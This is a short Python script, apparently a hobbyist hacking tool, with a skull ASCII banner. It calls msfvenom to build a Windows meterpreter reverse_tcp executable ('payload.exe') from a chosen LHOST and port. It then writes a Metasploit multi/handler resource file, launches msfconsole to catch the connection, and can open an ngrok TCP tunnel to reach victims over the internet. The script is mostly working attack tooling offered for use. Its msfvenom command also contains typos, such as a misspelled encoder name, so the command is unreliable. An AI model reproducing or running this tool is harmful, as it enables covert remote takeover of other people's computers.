# Coded by MonkeyFascist

import os
from time import sleep
import webbrowser


def banner():
    print('''
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             ::!H!&lt;   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:&lt;` !    ~?T#$$@@W@*?$$   /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
''')

    sleep(1)

    print("----------H4ckerM4n dev---------")
    
    sleep(1)

def main():
    os.system("clear")
    banner()
    print("What kind of payload you want to create?")
    print("--If you want to use this by WAN you need a ngrok tcp port running--")
    print("""
    [1] Reverse Tcp
    [2] Ngrok Server
    --Type the number inside the box--
""")
    ask = input(">>")
    if ask == "1":
        PayloadCreation()
    elif ask == "2":
        NgrokHandler()
    else:
        main()
	    

def NgrokHandler():
    ask = input("Do you have ngrok installed? [y/n] \n>>").lower()
    if ask == "n":
        os.system("clear")
        print("You need to install ngrok and set your auth key...")
        webbrowser.open('https://ngrok.com/download')
        exit()
    elif ask == "y":
        try:
            port = input("What port you want to use for ngrok? \n>>")
            print("Dont close this terminal, to set up the payload open another tab...")
            sleep(5)
            os.system("ngrok tcp {}".format(port)) # --- You can change the port if you want
        except:
            print("There was an error trying to set up ngrok tcp port")

def PayloadCreation():
    os.system("clear")
    banner()
    ip = input("Enter LHOST ip: ")
    port = input("\nEnter PORT: ")	
    print("\nCreating payload...")	
    os.system('msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -b “\\x00” -e x86/shikhata_ga_nai -f exe -o payload.exe'.format(ip, port))	
    sleep(5)	
    os.system("clear")	
    banner()	
    print("Creating settings...")	
    createPre(port)	
    print("Everythings done!\nLaunching mfsconsole...")	
    os.system("msfconsole -r DontDel.rc")

def createPre(port):
    try:
        rc = "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT {}\nrun".format(port)
        
        f = open("DontDel.rc", "w")
        f.write(rc)
        print("Settings file succesfully created!")
    except:
        print("There was an error trying to create the requirements file")


if __name__ == "__main__":
    main()
